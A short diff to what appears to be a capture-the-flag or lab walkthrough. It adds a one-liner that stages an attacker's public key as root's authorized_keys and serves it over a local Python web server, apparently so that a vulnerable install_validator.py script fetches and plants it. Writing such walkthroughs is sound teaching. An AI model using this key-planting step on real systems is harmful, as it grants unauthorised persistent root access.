@@ -2127,6 +2127,8 @@ The `install_validator.py` script expects a URL. To ensure the Python web server
 
 **Commands:** `mkdir -p ./root/.ssh/` `cp root_key.pub ./root/.ssh/authorized_keys` `python3 -m http.server 80`
 
+`mkdir -p ./root/.ssh/ && cp root_key.pub ./root/.ssh/authorized_keys`
+
 **Breakdown:**
 
 - `mkdir -p ./root/.ssh/`: Creates the nested folder structure. The `-p` flag ensures parent directories are created if they don't exist.
